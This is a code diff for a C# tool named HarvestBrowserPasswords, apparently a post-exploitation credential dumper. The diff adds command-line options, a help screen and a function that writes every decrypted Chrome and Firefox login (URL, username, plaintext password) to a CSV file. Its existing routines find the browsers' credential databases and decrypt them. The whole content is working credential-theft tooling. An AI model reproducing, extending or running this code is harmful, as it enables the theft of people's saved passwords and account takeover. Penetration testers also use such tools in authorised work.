@@ -1,11 +1,11 @@
-﻿using System;
+﻿using CommandLine;
+using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
 using System.Management;
 using System.Security.Principal;
 using System.Text;
-using System.IO;
-using CommandLine;
 
 namespace HarvestBrowserPasswords
 {
@@ -13,17 +13,23 @@ namespace HarvestBrowserPasswords
     {
         static void Main(string[] args)
         {
+            Console.ForegroundColor = ConsoleColor.Cyan;
+            Console.WriteLine("HarvestBrowserPasswords.exe v1.0");
+            Console.ResetColor();
+
             //Get username of current user account
             string userAccountName = GetCurrentUser();
 
             Options opts = new Options();
 
+            //Parse command line arguments
             var result = Parser.Default.ParseArguments<Options>(args)
-                .WithParsed(parsed => opts = parsed);
-            //.WithNotParsed(errors => Console.WriteLine($"Not parsed: {errors}"));
+                .WithParsed(parsed => opts = parsed)
+                .WithNotParsed(errors => PrintHelpToConsole());
 
             List<BrowserLoginData> loginDataList = new List<BrowserLoginData>();
 
+            //Check command line arguments
             if (opts.All)
             {
                 loginDataList = (loginDataList.Concat(GetChromePasswords(userAccountName))).ToList();
@@ -37,17 +43,29 @@ namespace HarvestBrowserPasswords
             {
                 loginDataList = (loginDataList.Concat(GetFirefoxPasswords(userAccountName, opts.Password))).ToList();
             }
+            else if (opts.Help)
+            {
+                PrintHelpToConsole();
+            }
+            else 
+            {
+                PrintHelpToConsole();
+            }
 
-            if (string.IsNullOrEmpty(opts.Outfile))
+            //Output all decrypted logins
+            if(loginDataList.Count > 0)
             {
-                Console.ForegroundColor = ConsoleColor.Yellow;
-                PrintLoginsToConsole(loginDataList);
+                if (string.IsNullOrEmpty(opts.Outfile))
+                {
+                    Console.ForegroundColor = ConsoleColor.Yellow;
+                    PrintLoginsToConsole(loginDataList);
+                }
+                else
+                {
+                    WriteToCSV(loginDataList, opts.Outfile);
+                }
             }
-            else
-            {
-                //Write to CSV
-                //WriteToCsv(LoginDataList, opts.Outfile);
-            }
+         
         }
 
         //Check if currently running in administrator context
@@ -70,7 +88,7 @@ namespace HarvestBrowserPasswords
                 if (File.Exists(loginDataFile))
                 {
                     Console.ForegroundColor = ConsoleColor.Green;
-                    Console.WriteLine($"[+] Found Chrome credential database for user: {userAccountName}");
+                    Console.WriteLine($"[+] Found Chrome credential database for user: \"{userAccountName}\" at: \"{loginDataFile}\"");
                     ChromeDatabaseDecryptor decryptor = new ChromeDatabaseDecryptor(loginDataFile);
 
                     loginDataList = (loginDataList.Concat(decryptor.ChromeLoginDataList)).ToList();
@@ -100,7 +118,7 @@ namespace HarvestBrowserPasswords
                     if (directory.Contains("Profile "))
                     {
                         profileDirectories.Add(directory);
-                        Console.WriteLine($"[+] Found Chrome Profile at {directory}");
+
                     }
                 }
             }
@@ -140,9 +158,6 @@ namespace HarvestBrowserPasswords
                 foreach (string directory in roamingProfiles)
                 {
                     profileDirectories.Add(directory);
-                    Console.ForegroundColor = ConsoleColor.Green;
-                    Console.WriteLine($"[+] Found Firefox Profile at {directory}");
-                    Console.ResetColor();
                 }
             }
 
@@ -158,31 +173,73 @@ namespace HarvestBrowserPasswords
             int index = userAccountSamCompatible.IndexOf("\\", 0, userAccountSamCompatible.Length) + 1;
             string userAccountName = userAccountSamCompatible.Substring(index);
 
-            Console.ForegroundColor = ConsoleColor.Yellow;
-            Console.WriteLine($"[*] Running As: {userAccountSamCompatible}");
-            Console.ResetColor();
-
             return userAccountName;
         }
 
         private static void PrintLoginsToConsole(List<BrowserLoginData> loginDataList)
         {
 
-            string line = new String('=', 60);
+            string line = new string('=', 60);
 
-            Console.ForegroundColor = ConsoleColor.Yellow;
+            Console.ForegroundColor = ConsoleColor.White;
+            Console.WriteLine(line);
 
             foreach (BrowserLoginData loginData in loginDataList)
             {
-                Console.WriteLine(line);
                 Console.WriteLine($"URL              {loginData.FormSubmitUrl}");
                 Console.WriteLine($"Username         {loginData.Username}");
                 Console.WriteLine($"Password         {loginData.Password}");
                 Console.WriteLine($"Browser          {loginData.Browser}");
+                Console.WriteLine(line);
             }
 
-            Console.WriteLine(line);
             Console.ResetColor();
+        }
+
+        private static void PrintHelpToConsole()
+        {
+            Console.ForegroundColor = ConsoleColor.Cyan;
+            Console.WriteLine("HarvestBrowserPasswords.exe v1.0\n");
+
+            Console.ForegroundColor = ConsoleColor.White;
+            Console.WriteLine("OPTIONS:");
+            Console.WriteLine("  -c, --chrome       Locate and decrypt Google Chrome logins\n");
+            Console.WriteLine("  -f, --firefox      Locate and decrypt Mozilla Firefox logins\n");
+            Console.WriteLine("  -a, --all          Locate and decrypt Google Chrome and Mozilla Firefox logins\n");
+            Console.WriteLine("  -p, --password     (Optional) Master password for Mozilla Firefox Logins\n");
+            Console.WriteLine("  -o, --outfile      Write output to csv\n");
+            Console.WriteLine("  --help             Display help message");
+
+            Console.ResetColor();
+        }
+
+        private static void WriteToCSV(List<BrowserLoginData> loginDataList, string outfile)
+        {
+            Console.ForegroundColor = ConsoleColor.Yellow;
+            Console.WriteLine($"[*] Writing decrypted logins to {outfile}");
+            Console.ResetColor();
+
+            try
+            {
+                using (StreamWriter file = new StreamWriter(outfile))
+                {
+                    file.WriteLine("URL,Username,Password,Browser");
+
+                    foreach (BrowserLoginData loginData in loginDataList)
+                    {
+                        file.WriteLine($"{loginData.FormSubmitUrl}," +
+                            $"{loginData.Username}," +
+                            $"{loginData.Password}," +
+                            $"{loginData.Browser}");
+                    }
+                }
+            }
+            catch (Exception e)
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine(e);
+                Console.ResetColor();
+            }
         }
     }  
 }
